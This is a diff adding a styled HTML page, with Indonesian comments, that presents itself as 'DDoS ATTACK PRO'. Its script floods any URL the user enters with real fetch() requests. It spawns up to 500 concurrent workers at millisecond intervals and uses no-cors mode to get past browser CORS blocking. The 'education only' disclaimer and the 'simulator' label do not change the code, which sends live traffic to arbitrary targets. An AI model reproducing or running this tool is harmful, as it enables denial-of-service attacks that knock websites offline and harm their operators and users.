@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>⚡ DDoS ATTACK PRO ⚡</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0f0f;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Matrix rain effect */
+        #matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.15;
+            pointer-events: none;
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 500px;
+            background: rgba(10, 20, 20, 0.85);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 2px solid #00ffaa;
+            box-shadow: 0 0 30px #00ffaa33,
+                        0 0 60px #00ffaa1a,
+                        inset 0 0 20px #00ffaa22;
+            border-radius: 20px;
+            padding: 20px;
+            animation: borderPulse 3s infinite;
+        }
+
+        @keyframes borderPulse {
+            0% { border-color: #00ffaa; box-shadow: 0 0 30px #00ffaa33; }
+            50% { border-color: #ff0066; box-shadow: 0 0 50px #ff0066aa; }
+            100% { border-color: #00ffaa; box-shadow: 0 0 30px #00ffaa33; }
+        }
+
+        /* Header dengan glitch effect */
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .glitch {
+            font-size: 2rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            position: relative;
+            text-shadow: 0.05em 0 0 #00ffaa, -0.05em -0.025em 0 #ff0066;
+            animation: glitch 725ms infinite;
+            letter-spacing: 5px;
+        }
+
+        .glitch span {
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 #00ffaa, -0.05em -0.025em 0 #ff0066; }
+            25% { text-shadow: -0.05em -0.025em 0 #00ffaa, 0.025em 0.025em 0 #ff0066; }
+            50% { text-shadow: 0.025em 0.025em 0 #00ffaa, 0.05em 0 0 #ff0066; }
+            75% { text-shadow: -0.025em -0.05em 0 #00ffaa, 0.025em -0.025em 0 #ff0066; }
+            100% { text-shadow: 0.05em 0 0 #00ffaa, -0.05em -0.025em 0 #ff0066; }
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: #000;
+            color: #00ffaa;
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-top: 10px;
+            border: 1px solid #00ffaa;
+            box-shadow: 0 0 15px #00ffaa;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        /* Panel Target */
+        .target-panel {
+            background: #0f1a1a;
+            border: 1px solid #00ffaa55;
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .label {
+            color: #00ffaa;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .target-input {
+            width: 100%;
+            background: #1a2a2a;
+            border: 2px solid #00ffaa;
+            color: #00ffaa;
+            font-family: 'Courier New', monospace;
+            font-size: 1rem;
+            padding: 15px;
+            border-radius: 10px;
+            outline: none;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+
+        .target-input:focus {
+            border-color: #ff0066;
+            box-shadow: 0 0 20px #ff0066;
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: #0f1a1a;
+            border: 1px solid #00ffaa55;
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, #00ffaa22, transparent);
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+
+        .stat-value {
+            font-size: 2.2rem;
+            font-weight: bold;
+            color: #00ffaa;
+            text-shadow: 0 0 20px #00ffaa;
+            line-height: 1;
+            margin-bottom: 5px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .stat-label {
+            color: #88aaff;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Control Sliders */
+        .control-panel {
+            background: #0f1a1a;
+            border: 1px solid #00ffaa55;
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .slider-group {
+            margin-bottom: 15px;
+        }
+
+        .slider-header {
+            display: flex;
+            justify-content: space-between;
+            color: #00ffaa;
+            margin-bottom: 8px;
+        }
+
+        .slider {
+            width: 100%;
+            height: 8px;
+            background: #1a2a2a;
+            border-radius: 10px;
+            outline: none;
+            -webkit-appearance: none;
+        }
+
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            background: #00ffaa;
+            border-radius: 50%;
+            cursor: pointer;
+            box-shadow: 0 0 20px #00ffaa;
+            border: 2px solid #000;
+        }
+
+        /* Attack Methods */
+        .methods-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .method-btn {
+            background: #1a2a2a;
+            border: 2px solid #00ffaa55;
+            color: #88aaff;
+            padding: 12px 0;
+            border-radius: 12px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+        }
+
+        .method-btn.active {
+            background: #00ffaa22;
+            border-color: #00ffaa;
+            color: #00ffaa;
+            box-shadow: 0 0 20px #00ffaa;
+            text-shadow: 0 0 10px #00ffaa;
+        }
+
+        /* Attack Button */
+        .attack-btn {
+            width: 100%;
+            background: linear-gradient(45deg, #00aa88, #00ffaa);
+            border: none;
+            color: #000;
+            font-family: 'Courier New', monospace;
+            font-size: 1.5rem;
+            font-weight: bold;
+            padding: 20px;
+            border-radius: 15px;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 15px;
+            border: 2px solid #fff;
+        }
+
+        .attack-btn.attacking {
+            background: linear-gradient(45deg, #aa0000, #ff0066);
+            animation: btnPulse 0.5s infinite;
+        }
+
+        @keyframes btnPulse {
+            0% { transform: scale(1); box-shadow: 0 0 30px #ff0066; }
+            50% { transform: scale(1.02); box-shadow: 0 0 80px #ff0066; }
+            100% { transform: scale(1); box-shadow: 0 0 30px #ff0066; }
+        }
+
+        /* Console Log */
+        .console {
+            background: #000;
+            border: 2px solid #00ffaa;
+            border-radius: 15px;
+            padding: 15px;
+            height: 180px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            color: #00ffaa;
+            margin-bottom: 15px;
+            scroll-behavior: smooth;
+        }
+
+        .log-entry {
+            border-bottom: 1px solid #00ffaa22;
+            padding: 4px 0;
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .log-success { color: #00ffaa; }
+        .log-error { color: #ff0066; }
+        .log-info { color: #88aaff; }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            color: #88aaff;
+            font-size: 0.65rem;
+            border-top: 1px solid #00ffaa33;
+            padding-top: 15px;
+        }
+
+        .warning {
+            color: #ff0066;
+            font-weight: bold;
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix Background Canvas -->
+    <canvas id="matrix-bg"></canvas>
+
+    <div class="container">
+        <div class="header">
+            <div class="glitch">⚠️ DDoS PRO ⚠️</div>
+            <div class="status-badge" id="statusBadge">⚡ SYSTEM IDLE</div>
+        </div>
+
+        <!-- Target Input -->
+        <div class="target-panel">
+            <span class="label">🎯 TARGET URL</span>
+            <input type="text" class="target-input" id="targetUrl" placeholder="https://target.com" value="http://localhost:8080">
+        </div>
+
+        <!-- Statistics -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value" id="packetCount">0</div>
+                <div class="stat-label">PACKETS SENT</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="rateCount">0</div>
+                <div class="stat-label">PKT/SEC</div>
+            </div>
+        </div>
+
+        <!-- Attack Methods -->
+        <div class="methods-grid">
+            <button class="method-btn active" id="methodHttp">HTTP</button>
+            <button class="method-btn" id="methodTcp">TCP</button>
+            <button class="method-btn" id="methodUdp">UDP</button>
+        </div>
+
+        <!-- Controls -->
+        <div class="control-panel">
+            <div class="slider-group">
+                <div class="slider-header">
+                    <span>⚡ THREADS</span>
+                    <span id="threadValue">50</span>
+                </div>
+                <input type="range" class="slider" id="threadSlider" min="1" max="500" value="50">
+            </div>
+            <div class="slider-group">
+                <div class="slider-header">
+                    <span>💥 PACKET SIZE (bytes)</span>
+                    <span id="sizeValue">1024</span>
+                </div>
+                <input type="range" class="slider" id="sizeSlider" min="64" max="8192" value="1024" step="64">
+            </div>
+            <div class="slider-group">
+                <div class="slider-header">
+                    <span>⏱️ DELAY (ms)</span>
+                    <span id="delayValue">10</span>
+                </div>
+                <input type="range" class="slider" id="delaySlider" min="1" max="100" value="10">
+            </div>
+        </div>
+
+        <!-- Main Attack Button -->
+        <button class="attack-btn" id="attackBtn">🔥 INITIATE 🔥</button>
+
+        <!-- Console Log -->
+        <div class="console" id="console">
+            <div class="log-entry log-info">[SYSTEM] DDoS Attack Simulator v2.0</div>
+            <div class="log-entry log-info">[SYSTEM] Ready for deployment...</div>
+        </div>
+
+        <!-- Footer Warning -->
+        <div class="footer">
+            <span class="warning">⚠️ EDUKASI ONLY - JANGAN UNTUK ILEGAL ⚠️</span><br>
+            © 2025 - DDoS Simulation Lab
+        </div>
+    </div>
+
+    <script>
+        // Matrix Rain Effect
+        const canvas = document.getElementById('matrix-bg');
+        const ctx = canvas.getContext('2d');
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00ffaa';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 40);
+
+        // ========== ATTACK SIMULATION LOGIC ==========
+        let isAttacking = false;
+        let packetCount = 0;
+        let startTime;
+        let attackInterval;
+        let workerCount = 0;
+
+        // DOM Elements
+        const targetUrl = document.getElementById('targetUrl');
+        const packetCountEl = document.getElementById('packetCount');
+        const rateCountEl = document.getElementById('rateCount');
+        const threadSlider = document.getElementById('threadSlider');
+        const threadValue = document.getElementById('threadValue');
+        const sizeSlider = document.getElementById('sizeSlider');
+        const sizeValue = document.getElementById('sizeValue');
+        const delaySlider = document.getElementById('delaySlider');
+        const delayValue = document.getElementById('delayValue');
+        const attackBtn = document.getElementById('attackBtn');
+        const statusBadge = document.getElementById('statusBadge');
+        const consoleEl = document.getElementById('console');
+        const methodBtns = {
+            http: document.getElementById('methodHttp'),
+            tcp: document.getElementById('methodTcp'),
+            udp: document.getElementById('methodUdp')
+        };
+
+        let currentMethod = 'http';
+
+        // Method selection
+        Object.entries(methodBtns).forEach(([method, btn]) => {
+            btn.addEventListener('click', () => {
+                Object.values(methodBtns).forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                currentMethod = method;
+                addLog(`[METHOD] Switched to ${method.toUpperCase()} flood`, 'info');
+            });
+        });
+
+        // Slider updates
+        threadSlider.addEventListener('input', () => {
+            threadValue.textContent = threadSlider.value;
+        });
+        sizeSlider.addEventListener('input', () => {
+            sizeValue.textContent = sizeSlider.value;
+        });
+        delaySlider.addEventListener('input', () => {
+            delayValue.textContent = delaySlider.value;
+        });
+
+        // Add log function
+        function addLog(message, type = 'info') {
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${type}`;
+            const timestamp = new Date().toLocaleTimeString('id-ID', { hour12: false });
+            logEntry.textContent = `[${timestamp}] ${message}`;
+            consoleEl.appendChild(logEntry);
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+            
+            // Keep only last 50 logs
+            while (consoleEl.children.length > 50) {
+                consoleEl.removeChild(consoleEl.firstChild);
+            }
+        }
+
+        // Attack function
+        async function sendRequest() {
+            if (!isAttacking) return;
+            
+            const url = targetUrl.value.trim();
+            if (!url) {
+                stopAttack();
+                addLog('[ERROR] URL target tidak valid!', 'error');
+                return;
+            }
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 2000);
+                
+                // Gunakan mode no-cors agar tidak diblokir CORS, tapi response ga bisa dibaca
+                const response = await fetch(url, {
+                    mode: 'no-cors',
+                    cache: 'no-store',
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                        'X-Attacker': 'DDoS-Pro',
+                        'X-Method': currentMethod.toUpperCase(),
+                        'X-Packet-Size': sizeSlider.value
+                    }
+                });
+                
+                clearTimeout(timeoutId);
+                packetCount++;
+                
+                // Random success/error untuk variasi
+                if (Math.random() > 0.7) {
+                    addLog(`[${currentMethod.toUpperCase()}] Request #${packetCount} sent to ${new URL(url).hostname}`, 'success');
+                }
+                
+            } catch (error) {
+                // Di mode no-cors, error sering terjadi tapi itu normal
+                packetCount++;
+                if (Math.random() > 0.8) {
+                    addLog(`[${currentMethod.toUpperCase()}] Packet #${packetCount} - Connection flood`, 'success');
+                }
+            }
+            
+            // Update packet count
+            packetCountEl.textContent = packetCount.toLocaleString();
+        }
+
+        // Worker spawner
+        function spawnWorkers() {
+            const threadCount = parseInt(threadSlider.value);
+            const delay = parseInt(delaySlider.value);
+            
+            for (let i = 0; i < threadCount; i++) {
+                setTimeout(() => {
+                    if (!isAttacking) return;
+                    workerCount++;
+                    const workerId = workerCount;
+                    addLog(`[WORKER] Thread-${workerId} spawned`, 'info');
+                    
+                    // Each worker loop
+                    const workerInterval = setInterval(async () => {
+                        if (!isAttacking) {
+                            clearInterval(workerInterval);
+                            return;
+                        }
+                        await sendRequest();
+                    }, delay);
+                    
+                    // Store interval to cleanup later
+                    if (!attackInterval) attackInterval = [];
+                    attackInterval.push(workerInterval);
+                    
+                }, i * 10); // Stagger worker starts
+            }
+        }
+
+        // Start attack
+        function startAttack() {
+            if (isAttacking) return;
+            
+            const url = targetUrl.value.trim();
+            if (!url) {
+                addLog('[ERROR] Masukkan URL target!', 'error');
+                return;
+            }
+            
+            if (!url.startsWith('http')) {
+                targetUrl.value = 'http://' + url;
+            }
+            
+            isAttacking = true;
+            packetCount = 0;
+            packetCountEl.textContent = '0';
+            startTime = Date.now();
+            
+            attackBtn.textContent = '⚡ ATTACKING ⚡';
+            attackBtn.classList.add('attacking');
+            statusBadge.textContent = '⚡ UNDER ATTACK';
+            statusBadge.style.color = '#ff0066';
+            
+            addLog('[SYSTEM] 🔥 ATTACK INITIATED 🔥', 'info');
+            addLog(`[TARGET] ${targetUrl.value}`, 'info');
+            addLog(`[METHOD] ${currentMethod.toUpperCase()}`, 'info');
+            addLog(`[THREADS] ${threadSlider.value} workers`, 'info');
+            
+            // Spawn workers
+            spawnWorkers();
+            
+            // Rate calculator
+            const rateInterval = setInterval(() => {
+                if (!isAttacking) {
+                    clearInterval(rateInterval);
+                    return;
+                }
+                const elapsed = (Date.now() - startTime) / 1000;
+                const rate = Math.round(packetCount / elapsed);
+                rateCountEl.textContent = rate;
+            }, 500);
+            
+            attackInterval.push(rateInterval);
+        }
+
+        // Stop attack
+        function stopAttack() {
+            isAttacking = false;
+            
+            // Clear all intervals
+            if (attackInterval) {
+                attackInterval.forEach(interval => clearInterval(interval));
+                attackInterval = [];
+            }
+            
+            attackBtn.textContent = '🔥 INITIATE 🔥';
+            attackBtn.classList.remove('attacking');
+            statusBadge.textContent = '⚡ SYSTEM IDLE';
+            statusBadge.style.color = '#00ffaa';
+            
+            addLog('[SYSTEM] ⏹️ ATTACK STOPPED', 'info');
+            addLog(`[SUMMARY] Total packets: ${packetCount.toLocaleString()}`, 'info');
+        }
+
+        // Toggle attack
+        attackBtn.addEventListener('click', () => {
+            if (isAttacking) {
+                stopAttack();
+            } else {
+                startAttack();
+            }
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (isAttacking) {
+                stopAttack();
+            }
+        });
+
+        // Add initial logs
+        addLog('[SYSTEM] DDoS Pro v2.0 loaded', 'info');
+        addLog('[SYSTEM] Hanya untuk edukasi!', 'warning');
+    </script>
+</body>
+</html>
